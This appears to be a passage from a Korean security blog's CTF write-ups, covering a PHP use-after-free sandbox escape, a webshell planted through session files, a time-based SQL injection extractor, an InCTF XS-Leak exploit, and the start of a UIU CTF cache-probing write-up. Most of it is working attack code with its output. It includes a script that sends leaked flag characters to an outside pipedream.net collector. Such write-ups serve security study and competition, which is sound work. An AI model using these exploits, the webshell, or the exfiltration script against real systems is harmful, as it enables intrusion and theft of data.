$p_flags == 6) { # PT_LOAD, PF_Read_Write            # handle pie            $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;            $data_size = $p_memsz;        } else if($p_type == 1 &amp;&amp; $p_flags == 5) { # PT_LOAD, PF_Read_exec            $text_size = $p_memsz;        }    }    if(!$data_addr || !$text_size || !$data_size)        die('Exploit failed: Unable to parse ELF');    return [$data_addr, $text_size, $data_size];}function get_basic_funcs($base, $elf) {    list($data_addr, $text_size, $data_size) = $elf;    for($i = 0; $i &lt; $data_size / 8; $i++) {        $leak = read($data_addr + $i * 8);        if($leak - $base &gt; 0 &amp;&amp; $leak &lt; $data_addr) {            $deref = read($leak);            # 'constant' constant check            if($deref != 0x746e6174736e6f63)                continue;        } else continue;        $leak = read($data_addr + ($i + 4) * 8);        if($leak - $base &gt; 0 &amp;&amp; $leak &lt; $data_addr) {            $deref = read($leak);            # 'bin2hex' constant check            if($deref != 0x786568326e6962)                continue;        } else continue;        return $data_addr + $i * 8;    }}function get_system($basic_funcs){    $addr = $basic_funcs;    do {        $f_entry = read($addr);        $f_name = read($f_entry, 6);        if($f_name == 0x6d6574737973) { # system            return read($addr + 8);        }        $addr += 0x20;    } while($f_entry != 0);    return false;}function get_system_address($binary_leak){    $base = get_binary_base($binary_leak);    print('ELF base: 0x' .dechex($base) . \"\\n\");    $elf = parse_elf($base);    $basic_funcs = get_basic_funcs($base, $elf);    print('Basic functions: 0x' .dechex($basic_funcs) . \"\\n\");    $zif_system = get_system($basic_funcs);    return $zif_system;}$dlls = [];$strs = [];$rw_dll = new SplDoublyLinkedList();# Create a chain of dangling triggers, which will all in turn# free current-&gt;next, push an element to the next list, and free current# This will make sure that every current-&gt;next points the same memory block,# which we will UAF.for($i = 0; $i &lt; NB_DANGLING; $i++){    $dlls[$i] = new SplDoublyLinkedList();    $dlls[$i]-&gt;push(new DanglingTrigger($i));    $dlls[$i]-&gt;rewind();}# We want our UAF'd list element to be before two strings, so that we can# obtain the address of the first string, and increase is size. We then have# R/W over all memory after the obtained address.define('NB_STRS', 50);for($i = 0; $i &lt; NB_STRS; $i++){    $strs[] = str_shuffle(str_repeat('A', SIZE_ELEM_STR));    i2s($strs[$i], 0, STR_MARKER);    i2s($strs[$i], 8, $i, 7);}# Free one string in the middle, ...$strs[NB_STRS - 20] = 123;# ... and put the to-be-UAF'd list element instead.$dlls[0]-&gt;push(0);# Setup the last DLlist, which will exploit the UAF$dlls[NB_DANGLING] = new SplDoublyLinkedList();$dlls[NB_DANGLING]-&gt;push(new UAFTrigger());$dlls[NB_DANGLING]-&gt;rewind();# Trigger the bug on the first list$dlls[0]-&gt;offsetUnset(0);die();import requestsdata = {    'payload': open('uaf.php').read().replace('&lt;?php', '')}response = requests.post(\"http://3.38.109.135:28344/data/bf233c59229bbbbe50aa44971fbb17c2/40977f3b892bcbc3edd5fd4f1d3abe38.pht?code=eval($_POST['payload']);\", data=data)print(response.text)위 poc 코드를 실행 시켜주면 UAF Sandbox Escape 공격으로 플래그를 읽어오는 것을 볼 수 있습니다.echo session_save_path().\"&lt;br&gt;\";mkdir(\"a\");mkdir(\"a/b\");chdir(\"a/b/\");session_save_path(\"../../plugin\");chdir(\"../..\");session_start();$_SESSION['test']=\"&lt;?php include(\\\"/flag\\\"); ?&gt;\";두 번째 , open_basedir 우회하는 방식은 session_save_path() 함수를 이용해서 세션 파일을 원하는 곳에 생성 시켜 우회하는 방식입니다. 일단 위 페이로드를 이용해서 ‘plugin/’ 디렉터리에 세션 파일로 웹쉘을 생성을 합니다.&lt;?php$p = $_GET[\"p\"] ?? \"about\";if(preg_match(\"/[^A-Za-z0-9\\-_]/\", $p))    $p = \"about\";include \"./$p\";/plugin에 인덱스 파일을 보면 입력값에 문자열 및 ‘-‘, ‘_’ 문자열만 포함되어 있어야 하고, include를 이용해서 입력값에 대한 파일을 가져오는 것을 알 수 있습니다. 그렇기 때문에 위에서 올린 세션 파일을 LFI를 이용해 가져와 실행 시키면 플래그를 획득할 수 있습니다. 세션 파일명은 (sess_phpsessid) 입니다.일단 위 코드를 pht 확장자로 업로드 합니다.파일을 실행 하고, LFI 취약점을 이용해 파일을 실행 하니 플래그가 출력되는 것을 볼 수 있습니다.FLAG{b4s3dir_i5_n0t_s4fe_h4h4}(Web) BitTrader [482 pts]  BitTrader 문제는 join을 이용해서 테이블을 여러개 조인 해 줄 경우 발생하는 슬립 현상을 이용해서 Time Based SQL Injection을 하는 문제 입니다.해당 문제는 대회 당시에 Mudbox와 다르게 그냥 감 자체를 잡지 못 했고, 공부용으로도 너무 좋은 문제라서 대회가 끝났지만 계속 풀어보기로 했습니다. 일단 대회 당시에 SQL Injection인 것을 알았지만 어떤 식으로 데이터를 추출해야 하는 지 알지 못 했습니다.일단 문제 페이지를 보면 위와 같이 비트코인, 이더리움, 리플, 도지 코인의 현재 가격을 출력해주는 것을 확인할 수 있습니다.그리고 Trade 버튼을 클릭하면 특정 코인의 가격을 5초 간격으로 나타나는 지표를 확인할 수 있으며, 네트워크 창을 확인 해보면 api(ajax_ticks.php?symbol=btc)로 요청 해서 코인의 현재 가격을 가져 오는 것을 확인할 수 있습니다./ajax_ticks.php?symbol=btc로 접속을 하면 위와 같이 결과 값을 반환하는 것을 확인할 수 있습니다.그래서 여기가 SQL Injection 공격 포인트라 생각하고, 여러 페이로드를 보내면서 익스를 시도 하였지만 성공하지 못 했습니다. 일단 대부분에 특수 문자가 막혀 있기 때문에 싱글 쿼터 및 함수 자체를 사용할 수 없었습니다.SELECT ~~ FROM price_$symbol limit 0, 10하지만 symbol의 값이 where 절에 들어가는 것이 아닌 위와 같이 테이블 명에 들어가기 때문에 싱글 쿼터를 우회할 필요가 없었으며 익스플로잇은 join을 이용해 테이블 여러개를 조인 시켜 줄 경우에 발생하는 에러 또는 슬립 현상을 이용해 Error/Time Based SQL Injection을 이용해야 했습니다. 저는 슬립 현상을 이용해서 타임어택을 하였지만 효율성은 에러를 이용하는 것이 좋아 보입니다.select * from users cross join information_schema.tables cross join information_schema.columns on 1=0;select * from users cross join information_schema.tables cross join information_schema.columns on 1=1;일단 로컬에서 cross join을 이용해 메타 테이블들을 이어주는 퀴러를 위와 같이 작성 해 테스트를 해보았습니다. 사진을 보면 거짓일 때는, 쿼리 실행이 바로 종료 되지만, 참일 때는 오랜시간 슬립 현상이 발생하는 것을 확인할 수 있었습니다.그렇기 때문에 이를 이용해서 Time Based SQL Injection을 이용해 디비 정보를 모두 추출하면 됩니다.btc cross join information_schema.columns cross join information_schema.tables on 1=1그래서 cross join을 이용하여 위와 같이 메타 테이블 2개를 엮어주는 쿼리를 전송해주니 약 4초 정도 Sleep이 발생하는 것을 볼 수 있습니다. 이제 이를 이용해서 Time Based SQL Injection을 하면 될 거 같습니다 :)import requestsimport stringurl = \"http://15.165.49.138:26354/ajax_ticks.php?symbol=btc cross join information_schema.statistics cross join information_schema.processlist cross join information_schema.tables as m cross join information_schema.columns on m.table_name like 0x{}\"leaked = \"\"while True:    for s in string.printable:        f = url.format((leaked + s + '%').encode().hex())        r = requests.get(f)        print(f\"C: {s}, T: {r.elapsed}\")일단 테이블 명의 첫 글자들을 확인하기 위해 위와 같이 코드를 작성하였습니다. 그리고 문제에서는 테이블/컬럼 명, 레코드 값을 뽑을 때는 두 개의 테이블로는 크기가 부족해서 statistics, processlist 테이블을 추가로 조인 시켜 주었으며 위와 같이 PoC 코드를 작성해주었습니다.C: 0, T: 0:00:00.040496C: 1, T: 0:00:00.039568C: 2, T: 0:00:00.033084C: 3, T: 0:00:00.054973C: 4, T: 0:00:00.040466C: 5, T: 0:00:00.033778C: 6, T: 0:00:00.036218C: 7, T: 0:00:00.039113C: 8, T: 0:00:00.039524C: 9, T: 0:00:00.043274C: a, T: 0:00:00.042083C: b, T: 0:00:00.037688C: c, T: 0:00:02.985553C: d, T: 0:00:00.041576C: e, T: 0:00:03.037683C: f, T: 0:00:03.260697C: g, T: 0:00:03.217965C: h, T: 0:00:00.036901C: i, T: 0:00:02.984188C: j, T: 0:00:00.042655C: k, T: 0:00:01.794134C: l, T: 0:00:01.048942C: m, T: 0:00:00.036848C: n, T: 0:00:00.037003C: o, T: 0:00:01.728545C: p, T: 0:00:03.069760C: q, T: 0:00:00.046779C: r, T: 0:00:03.427775C: s, T: 0:00:02.869415C: t, T: 0:00:02.965769C: u, T: 0:00:01.839867C: v, T: 0:00:02.045197C: w, T: 0:00:00.045391C: x, T: 0:00:00.038370C: y, T: 0:00:00.034550C: z, T: 0:00:00.040592C: A, T: 0:00:00.038777C: B, T: 0:00:00.035266C: C, T: 0:00:02.923604C: D, T: 0:00:00.043928C: E, T: 0:00:03.431379C: F, T: 0:00:03.434538C: G, T: 0:00:03.437290C: H, T: 0:00:00.041747C: I, T: 0:00:02.984453C: J, T: 0:00:00.044469C: K, T: 0:00:01.692472C: L, T: 0:00:00.040697C: M, T: 0:00:00.034870C: N, T: 0:00:00.039964C: O, T: 0:00:01.844985C: P, T: 0:00:02.975808C: Q, T: 0:00:00.050623C: R, T: 0:00:03.314133C: S, T: 0:00:02.897688C: T, T: 0:00:03.033871C: U, T: 0:00:02.356644C: V, T: 0:00:01.630371C: W, T: 0:00:00.042096C: X, T: 0:00:00.042518C: Y, T: 0:00:00.053940C: Z, T: 0:00:00.042300코드를 돌려보니 위와 같이 꽤나 정확한 오라클 결과들을 얻을 수 있었고, 위 오라클을 기반으로 테이블 명을 뽑아 보다가 f에서 files, flag라는 테이블이 존재하는 것을 확인하였고, 이를 기반으로 컬럼, 레코드 값을 뽑기로 하였습니다.import requestsimport stringimport timestr_list = string.printable.replace('%','').replace('_','')def execute(s, url, data, Time):\tresult = data\tp = 1\twhile p == 1:\t\tstart = result\t\tfor s in str_list:\t\t\tstart_time = time.time()\t\t\trequests.get(url.format((result + s + '%').encode().hex()))\t\t\tif (time.time() - start_time) &gt; Time:\t\t\t\tresult += s\t\t\t\tbreak\t\tif start == result:\t\t\tp = 0\treturn resultif __name__ == '__main__':\tprint(\"[*] Start an exploit\")\tprint(f\"[*] The table name is {execute('fl', 'http://15.165.49.138:26354/ajax_ticks.php?symbol=btc cross join information_schema.statistics cross join information_schema.processlist cross join information_schema.tables as m cross join information_schema.columns on m.table_name like 0x{}', 'fl', 1.4)}\")\tprint(f\"[*] The column name is {execute('fl', 'http://15.165.49.138:26354/ajax_ticks.php?symbol=btc cross join information_schema.statistics cross join information_schema.processlist cross join information_schema.tables as m cross join information_schema.columns as f on f.column_name like 0x{}', 'fl', 0.1)}\")\tprint(f\"[*] The flag is {execute('fl', 'http://15.165.49.138:26354/ajax_ticks.php?symbol=btc cross join information_schema.statistics cross join information_schema.processlist cross join information_schema.tables as m cross join information_schema.columns cross join flag as c on c.flag like 0x{}', 'fl', 1.4)}\")\tprint(\"[*] Congratulations for to leak a flag XD\")PoC 코드를 돌려 주면 위 사진처럼 테이블/컬럼 명 및 플래그 릭에 성공하는 것을 확인할 수 있습니다.FLAG : FLAG{d0geg0estom4rs}"
  },
  
  {
    "title": "InCTF 2021 Notepad 1.5 - Arthur's Article Write Up",
    "url": "/posts/In-CTF/",
    "categories": "",
    "tags": "",
    "date": "2021-08-17 08:29:53 +0900",
    





    
    "snippet": "What is Download Trigger?엔드포인트에서 Content-Disposition: attachment 헤더가 설정이 되면 브라우저는 응답을 하는 대신에 다운로드 할 파일을 탐색한다고 합니다. 특정 상황에 따라서 사용자의 계정 상태 및 여러 요소들에 따라서 달라지는 경우를 이용해서 중요 정보를 수집할 수 있습니다.Download Trigg...",
    "content": "What is Download Trigger?엔드포인트에서 Content-Disposition: attachment 헤더가 설정이 되면 브라우저는 응답을 하는 대신에 다운로드 할 파일을 탐색한다고 합니다. 특정 상황에 따라서 사용자의 계정 상태 및 여러 요소들에 따라서 달라지는 경우를 이용해서 중요 정보를 수집할 수 있습니다.Download Trigger 기법 중 첫 번째 방식은 크로니움 기반 브라우저에서 파일을 다운로드 하게 되면 위와 같이 브라우저 하단에 다운로드 한 파일의 미리 보기가 나타나는 것을 이용하는 것 입니다. 파일이 다운로드 될 때와, 다운로드가 되지 않을 때의 창 높낮이를 이용해서 정보를 유추하는 방식입니다.var screenHeight = window.innerHeight;window.open('https://github.com/wjddnjs33/Exploit/archive/refs/heads/main.zip');setTimeout(() =&gt; {    if (window.innerHeight &lt; screenHeight) {      console.log('Download bar detected');    } else {      console.log('Download bar not detected');    }}, 2000);POC는 위와 같습니다.정상적으로 파일이 다운로드 되었을 때 입니다.파일이 다운로드 되지 않았을 때 입니다.정상적으로 파일이 다운로드가 되었을 때는, 브라우저 하단에 생성된 창에 의해서 기본의 창에 크기보다 작아 졌기 때문에 다운로드 바가 탐지 되어 다고 출력이 되고, 되지 않았을 때는 창의 크기가 그대로이므로 다운로드 바가 탐지 되지 않았다고 출력 되는 것을 볼 수 있습니다.두 번째 방식은 iframe을 이용해서 첨부 파일 탐색이 되었을 때, iframe이 교차 출처로 되는 것을 이용해서 판단하는 기법입니다.var url = 'https://github.com/wjddnjs33/Exploit/archive/refs/heads/main.zip';var iframe = document.createElement('iframe');document.body.appendChild(iframe);iframe.srcdoc = `&lt;iframe src=\"${url}\" &gt;&lt;/iframe&gt;`;iframe.onload = () =&gt; {      try {          iframe.contentWindow.frames[0].origin;          console.log('Download attempt detected');      } catch(e) {          console.log('No download attempt detected');      }}POC는 위와 같습니다.세 번째 방식은 두 번째 방식과 원리는 동일 하지만 iframe을 사용하지 않고 트리거 하는 방식 입니다.var url = 'https://example.org';var win = window.open(url);setTimeout(() =&gt; {      try {          // If a navigation occurs, the iframe will be cross-origin,          // so accessing \"win.origin\" will throw an exception          win.origin;          parent.console.log('Download attempt detected');      } catch(e) {          parent.console.log('No download attempt detected');      }}, 2000);POC는 위와 같습니다.Exploit (Web) InCTF 2021 - Notepad 1.5 - Arthur’s Article [900 pts]  Notepad 1.5 - Arthur’s Article 문제는 XS-Leak을 이용하여 플래그를 획득하는 문제 입니다.package mainimport (\t\"crypto/md5\"\t\"encoding/hex\"\t\"flag\"\t\"fmt\"\t\"html\"\t\"log\"\t\"math/rand\"\t\"net/http\"\t\"os\"\t\"regexp\"\t\"strings\"\t\"time\"\t\"github.com/gorilla/handlers\"\t\"github.com/gorilla/mux\")const adminID = \"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\"const adminNOTE = \"inctf{flag}\"var Notes = make(map[string]string)// Prevent XSS on api-endpoints ¬‿¬var cType = map[string]string{\t\"Content-Type\":            \"text/plain\",\t\"x-content-type-options\":  \"nosniff\",\t\"X-Frame-Options\":         \"DENY\",\t\"Content-Security-Policy\": \"default-src 'none';\",}func cookGenerator() string {\thash := md5.Sum([]byte(string(rand.Intn(30))))\treturn hex.EncodeToString((hash)[:])}func headerSetter(w http.ResponseWriter, header map[string]string) {\tfor k, v := range header {\t\tw.Header().Set(k, v)\t}}func getIDFromCooke(r *http.Request, w http.ResponseWriter) string {\tvar cooke, err = r.Cookie(\"id\")\tre := regexp.MustCompile(\"^[a-zA-Z0-9]+$\")\tvar cookeval string\tif err == nil &amp;&amp; re.MatchString(cooke.Value) &amp;&amp; len(cooke.Value) &lt;= 35 &amp;&amp; len(cooke.Value) &gt;= 30 {\t\tcookeval = cooke.Value\t} else {\t\tcookeval = cookGenerator()\t\tc := http.Cookie{\t\t\tName:     \"id\",\t\t\tValue:    cookeval,\t\t\tSameSite: 2,\t\t\tHttpOnly: true,\t\t\tSecure:   false,\t\t}\t\thttp.SetCookie(w, &amp;c)\t}\treturn cookeval}func add(w http.ResponseWriter, r *http.Request) {\tid := getIDFromCooke(r, w)\tif id != adminID {\t\tr.ParseForm()\t\tnoteConte := r.Form.Get(\"content\")\t\tif len(noteConte) &lt; 75 {\t\t\tNotes[id] = noteConte\t\t}\t}\tfmt.Fprintf(w, \"OK\")}func get(w http.ResponseWriter, r *http.Request) {\tid := getIDFromCooke(r, w)\tx := Notes[id]\theaderSetter(w, cType)\tif x == \"\" {\t\tfmt.Fprintf(w, \"404 No Note Found\")\t} else if regexp.MustCompile(\"&lt;[a-zA-Z0-9]\").MatchString(x) {\t\tfmt.Fprintf(w, html.EscapeString(x))\t} else {\t\tfmt.Fprintf(w, x)\t}}func find(w http.ResponseWriter, r *http.Request) {\tid := getIDFromCooke(r, w)\tparam := r.URL.Query()\tx := Notes[id]\tvar which string\tstr, err := param[\"condition\"]\tif !err {\t\twhich = \"any\"\t} else {\t\twhich = str[0]\t}\tvar start bool\tstr, err = param[\"startsWith\"]\tif !err {\t\tstart = strings.HasPrefix(x, \"arthur\")\t} else {\t\tstart = strings.HasPrefix(x, str[0])\t}\tvar responseee string\tvar end bool\tstr, err = param[\"endsWith\"]\tif !err {\t\tend = strings.HasSuffix(x, \"morgan\")\t} else {\t\tend = strings.HasSuffix(x, str[0])\t}\tif which == \"starts\" &amp;&amp; start {\t\tresponseee = x\t} else if which == \"ends\" &amp;&amp; end {\t\tresponseee = x\t} else if which == \"both\" &amp;&amp; (start &amp;&amp; end) {\t\tresponseee = x\t} else if which == \"any\" &amp;&amp; (start || end) {\t\tresponseee = x\t} else {\t\t_, present := param[\"debug\"]\t\tif present {\t\t\tdelete(param, \"debug\")\t\t\tdelete(param, \"startsWith\")\t\t\tdelete(param, \"endsWith\")\t\t\tdelete(param, \"condition\")\t\t\tfor v, d := range param {\t\t\t\tfor _, k := range d {\t\t\t\t\tif regexp.MustCompile(\"^[a-zA-Z0-9{}_;-]*$\").MatchString(k) &amp;&amp; len(d) &lt; 5 {\t\t\t\t\t\tw.Header().Set(v, k)\t\t\t\t\t}\t\t\t\t\tbreak\t\t\t\t}\t\t\t\tbreak\t\t\t}\t\t}\t\tresponseee = \"404 No Note Found\"\t}\theaderSetter(w, cType)\tfmt.Fprintf(w, responseee)}// Reset notes every 30 mins.  No Vuln in thisfunc resetNotes() {\tNotes[adminID] = adminNOTE\tfor range time.Tick(time.Second * 1 * 60 * 30) {\t\tNotes = make(map[string]string)\t\tNotes[adminID] = adminNOTE\t}}func main() {\trand.Seed(time.Now().UnixNano())\tvar dir string\tflag.StringVar(&amp;dir, \"dir\", \"./public\", \"the directory to serve files from. Defaults to the current dir\")\tflag.Parse()\tgo resetNotes()\tr := mux.NewRouter()\ts := r.Host(\"chall.notepad15.gq:1515\").Subrouter()\ts.HandleFunc(\"/add\", add).Methods(\"POST\")\ts.HandleFunc(\"/get\", get).Methods(\"GET\")\ts.HandleFunc(\"/find\", find).Methods(\"GET\")\ts.PathPrefix(\"/\").Handler(http.StripPrefix(\"/\", http.FileServer(http.Dir(dir))))\tfmt.Println(\"Server started at http://0.0.0.0:3000\")\tloggedRouter := handlers.LoggingHandler(os.Stdout, r)\tsrv := &amp;http.Server{\t\tAddr: \"0.0.0.0:3000\",\t\t// Good practice to set timeouts to avoid Slowloris attacks.\t\tWriteTimeout: time.Second * 15,\t\tReadTimeout:  time.Second * 15,\t\tIdleTimeout:  time.Second * 60,\t\tHandler:      loggedRouter, // Pass our instance of gorilla/mux in.\t}\tif err := srv.ListenAndServe(); err != nil {\t\tlog.Println(err)\t}}해당 문제의 서버는 Go라는 프로그래밍 언어로 작성이 되어 있습니다.func main() {\trand.Seed(time.Now().UnixNano())\tvar dir string\tflag.StringVar(&amp;dir, \"dir\", \"./public\", \"the directory to serve files from. Defaults to the current dir\")\tflag.Parse()\tgo resetNotes()\tr := mux.NewRouter()\ts := r.Host(\"chall.notepad15.gq:1515\").Subrouter()\ts.HandleFunc(\"/add\", add).Methods(\"POST\")\ts.HandleFunc(\"/get\", get).Methods(\"GET\")\ts.HandleFunc(\"/find\", find).Methods(\"GET\")\ts.PathPrefix(\"/\").Handler(http.StripPrefix(\"/\", http.FileServer(http.Dir(dir))))\tfmt.Println(\"Server started at http://0.0.0.0:3000\")\tloggedRouter := handlers.LoggingHandler(os.Stdout, r)\tsrv := &amp;http.Server{\t\tAddr: \"0.0.0.0:3000\",\t\t// Good practice to set timeouts to avoid Slowloris attacks.\t\tWriteTimeout: time.Second * 15,\t\tReadTimeout:  time.Second * 15,\t\tIdleTimeout:  time.Second * 60,\t\tHandler:      loggedRouter, // Pass our instance of gorilla/mux in.\t}\tif err := srv.ListenAndServe(); err != nil {\t\tlog.Println(err)\t}}main() 함수는 go 파일이 실행될 때, 실행이 되는 곳 입니다. C언어에 main() 함수와 동일 합니다. 일단 코드를 보면 /add, /get, /find, / 경로로 라우팅을 시켜주는 것을 볼 수 있습니다.func add(w http.ResponseWriter, r *http.Request) {\tid := getIDFromCooke(r, w)\tif id != adminID {\t\tr.ParseForm()\t\tnoteConte := r.Form.Get(\"content\")\t\tif len(noteConte) &lt; 75 {\t\t\tNotes[id] = noteConte\t\t}\t}\tfmt.Fprintf(w, \"OK\")}/add 기능은 메모 작성을 저장하는 기능인데 코드를 보면 getIDFromCooke() 함수를 이용해서 쿠키에서 id를 가져 온 후에 id가 관리자 아이디와 동일하지 않으면 입력한 값을 Notes[id]에 넣어주는 것을 볼 수 있습니다. 여기서 getIDFromCooke() 함수는 그냥 현재 요청 한 사용자의 쿠키에서 id 값을 가져와서 id가 없으면 생성하고, 있으면 그냥 그 값을 반환해주는 함수입니다.func get(w http.ResponseWriter, r *http.Request) {\tid := getIDFromCooke(r, w)\tx := Notes[id]\theaderSetter(w, cType)\tif x == \"\" {\t\tfmt.Fprintf(w, \"404 No Note Found\")\t} else if regexp.MustCompile(\"&lt;[a-zA-Z0-9]\").MatchString(x) {\t\tfmt.Fprintf(w, html.EscapeString(x))\t} else {\t\tfmt.Fprintf(w, x)\t}}/get 기능은 /add 기능으로 작성한 메모를 보여주는 기능 입니다. getIDFromCooke() 함수로 id를 가져와서 id 값을 가진 메모를 가져온 후에 Fprintf() 함수로 출력하는 것을 볼 수 있습니다.func find(w http.ResponseWriter, r *http.Request) {\tid := getIDFromCooke(r, w)\tparam := r.URL.Query()\tx := Notes[id]\tvar which string\tstr, err := param[\"condition\"]\tif !err {\t\twhich = \"any\"\t} else {\t\twhich = str[0]\t}\tvar start bool\tstr, err = param[\"startsWith\"]\tif !err {\t\tstart = strings.HasPrefix(x, \"arthur\")\t} else {\t\tstart = strings.HasPrefix(x, str[0])\t}\tvar responseee string\tvar end bool\tstr, err = param[\"endsWith\"]\tif !err {\t\tend = strings.HasSuffix(x, \"morgan\")\t} else {\t\tend = strings.HasSuffix(x, str[0])\t}\tif which == \"starts\" &amp;&amp; start {\t\tresponseee = x\t} else if which == \"ends\" &amp;&amp; end {\t\tresponseee = x\t} else if which == \"both\" &amp;&amp; (start &amp;&amp; end) {\t\tresponseee = x\t} else if which == \"any\" &amp;&amp; (start || end) {\t\tresponseee = x\t} else {\t\t_, present := param[\"debug\"]\t\tif present {\t\t\tdelete(param, \"debug\")\t\t\tdelete(param, \"startsWith\")\t\t\tdelete(param, \"endsWith\")\t\t\tdelete(param, \"condition\")\t\t\tfor v, d := range param {\t\t\t\tfor _, k := range d {\t\t\t\t\tif regexp.MustCompile(\"^[a-zA-Z0-9{}_;-]*$\").MatchString(k) &amp;&amp; len(d) &lt; 5 {\t\t\t\t\t\tw.Header().Set(v, k)\t\t\t\t\t}\t\t\t\t\tbreak\t\t\t\t}\t\t\t\tbreak\t\t\t}\t\t}\t\tresponseee = \"404 No Note Found\"\t}\theaderSetter(w, cType)\tfmt.Fprintf(w, responseee)}/find 기능은 사용자가 저장한 메모가 존재하는 지 없는 지 찾은 후에, 존재/미존재를 분기로 처리하는 로직입니다.  Information  condition 값을 가져와서 str 변수에 저장합니다.  만약 에러가 났다면 which 변수에 \"any\"라는 문자열을 넣어주고, 에러가 나지 않았다면 우리가 입력한 condition의 값을 which에 넣어줍니다.  startsWith 값을 가져와서 str 변수에 저장합니다.  에러가 나지 않았다면 strings.HasPrefix() 메서드를 이용해서 startsWith 값을 x의 값과 비교하는 것을 볼 수 있습니다. ( 이때 x의 값은 현재 사용자가 저장한 노트 값이고, strings.HasPrefix() 메서드는 자바스크립트에서 includes()와 동일 합니다. )  endsWith 값을 가져와서 str 변수에 저장합니다.  에러가 나지 않았다면 strings.HasSuffix() 메서드를 이용해서 endsWith 값을 x의 값과 비교하는 것을 볼 수 있습니다. ( 이때 x의 값은 현재 사용자가 저장한 노트 값이고, strings.HasSuffix() 메서드는 자바스크립트에서 includes()와 동일 하지만 뒤에서부터 검사합니다. )  start/end 로직이 끝나면 여러 분기 별로 처리하는 것을 볼 수 있는데, 이때 모든 분기와 일치하지 않는 다면 debug 값을 가져와서 _와 present에 넣는 것을 볼 수 있습니다. 이때 present에는 true가 들어갑니다.  presend의 값이 true 이면 debug, startWith, endsWith, condition 파라미터를 모두 지우고, 다른 파라미터가 있다면 해당 파라미터를 기반으로 Header() 메서드를 이용해서 응답 헤더를 설정하는 것을 볼 수 있습니다.  모든 처리가 끝나면 headerSetter() 함수를 이용해서 응답 헤더를 설정하고, Fprintf() 함수를 이용해서 출력하는 것을 볼 수 있습니다.여기서 중요한 부분은 우리가 입력한 값과 노트의 값이 일치 하지 않으면 else 문 내부에 들어가는데, 여기서 응답 헤더 하나를 우리가 설정할 수 있다는 것 입니다. 우린 아까 위에서 Download Trigger에 대해서 배웠는데, 엔드포인트에서 Content-Disposition: attachment 헤더를 설정해서 반환하면 브라우저는 첨부 파일을 탐색하고 파일을 설치 한다는 것을 배웠습니다.그럼 우리가 입력한 값과 노트의 값이 일치 하지 않을 때는 Content-Disposition: attachment 헤더를 설정해 파일이 다운로드 되게 하고, 우리가 입력한 값과 노트의 값이 일치하면 파일은 다운로드 하지 않게 만들 수 있고, 이를 이용하면 XS-Leak 공격을 이용해 노트 값을 파악할 수 있습니다.그러므로 봇을 이용해 /find로 요청을 보내면 id 값은 관리자의 id 이므로 노트의 값으로 플래그가 들어올 것 이고, 이를 XS-Leak 공격을 이용해서 플래그를 획득할 수 있습니다.분석한 /find 로직을 확인하기 위해 위와 같이 메모를 작성했습니다.확인을 해보니 입력값과 노트 값이 일치하면 노트 값이 출력이 되고, 일치 하지 않으면 파일이 다운로드 되는 것을 확인할 수 있었습니다. 이제 이를 이용해 플래그를 획득하면 될 거 같습니다.&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;head&gt;        &lt;title&gt;Notepad 1.5 - Arthur's Article Poc&lt;/title&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;script&gt;            const string = \"abcdefghijklmnopqrstuvwxyz1234567890~}{!@$%^*)(_+\";            let flag = 'inctf{';            function xs(flag, str) {                let url = `http://chall.notepad15.gq:1515/find?condition=starts&amp;debug&amp;Content-Disposition=attachment&amp;startsWith=${flag + str}`;                const MyWindow = window.open(url);                setTimeout(() =&gt; {                    try{                        MyWindow.origin;                    } catch (err) {                        flag += str;                        fetch(\"https://79a9bb50560aa2c77156e03b431dc2b3.m.pipedream.net/\" + flag)                        broute_force(flag);                    }                }, 1000);            }            function broute_force(flag) {                for ( let i = 0; i &lt; string.length; i ++) {                    xs(flag, string[i])                }            }            broute_force(flag);        &lt;/script&gt;    &lt;/body&gt;&lt;/html&gt;위와 같이 익스플로잇 코드를 작성 후에 봇으로 넘겨주니 위와 같이 플래그를 뽑을 수 있었습니다.FLAG : inctf{red_dead_rezoday_ialmvwoawpwe}"
  },
  
  {
    "title": "UIU CTF 2021 yana Write Up",
    "url": "/posts/UIU-CTF/",
    "categories": "",
    "tags": "",
    "date": "2021-08-05 08:29:53 +0900",
    





    
    "snippet": "What is cache probingIt is said that the loading speed of the resource file is different from the first time the browser loads the resource file and from the second time. The reason is that the sec...",
    "content": "What is cache probingIt is said that the loading speed of the resource file is different from the first time the browser loads the resource file and from the second time. The reason is that the second time the resource file is fetched, the image cache is fetched from disk, not by requesting it from the web server.The photo on the right is when the image is first loaded, and the photo on the left is when the image is loaded the second time. If you look at the time, you can see that there is a difference by the ratio of 0ms : 48ms. So how can use this to link with XS-Leak?Exploit (Web) UIU CTF 2021 - yana [342 pts]  The challenge is leak the flag and using the cache probing and xs-leak :)If you went to the challenge, you can see a notepad function as above. I checked, the function as top is to save a content and function as bottom is to search for saved memo.So, I saved a memo as pocas and not_pocas. I did a saerch for pocas on the left and searched for asdf on the right after saved the memo.OMG, I did a search and came up with surprising result!! It was immediately returned with a different color image!! I can know an important information here.  Information  If you search for a cunrently saved memo, a green image appears.  If you search for a unsaved memo, a red image appears.const noteForm = document.getElementById(\"note\");noteForm.onsubmit = (e) =&gt; {    e.preventDefault();    window.localStorage.setItem(\"note\", new FormData(noteForm).get(\"note\"));};const searchForm = document.getElementById(\"search\");const output = document.getElementById(\"output\");searchForm.onsubmit = (e) =&gt; {    e.preventDefault();    const query = new FormData(searchForm).get(\"search\") ?? \"\";    document.location.hash = query;    search();};function search() {    const note = window.localStorage.getItem(\"note\") ?? \"\";    console.log(`note: ${note}`);    const query = document.location.hash.substring(1);    console.log(`query: ${query}`);    if (query) {        if (note.includes(query)) {            console.log('found');            output.innerHTML =            'found! &lt;br/&gt;&lt;img src=\"https://sigpwny.com/uiuctf/y.png\"&gt;&lt;/img&gt;';        } else {            console.log('not found');            output.innerHTML =            'nope.. &lt;br/&gt;&lt;img src=\"https://sigpwny.com/uiuctf/n.png\"&gt;&lt;/img&gt;';        }    }}search();Now that I’ve done a functiona analysis, let’s analyze the client-side code.  Analysis ( search() )  Get the currently stored content value using window.localStorage.getItem(\"note\").  Get the query value using document.location.hash.substring(1).  Use note.includes(query) to check whether the value of the query is included in the note. ( Important )  If the query value is included in the note, a green image appears, otherwise a red image appears./*NOTE: this is the script that the admin bot runs to visit your provided URLit not required to solve the challenge, but is provided for reference &amp; for you to help test/debug your exploit*/const { chromium } = require('playwright-chromium');const fs = require('fs');const net = require('net');const FLAG = fs.readFileSync('/flag.txt', {encoding: 'utf-8'});// matches regex: 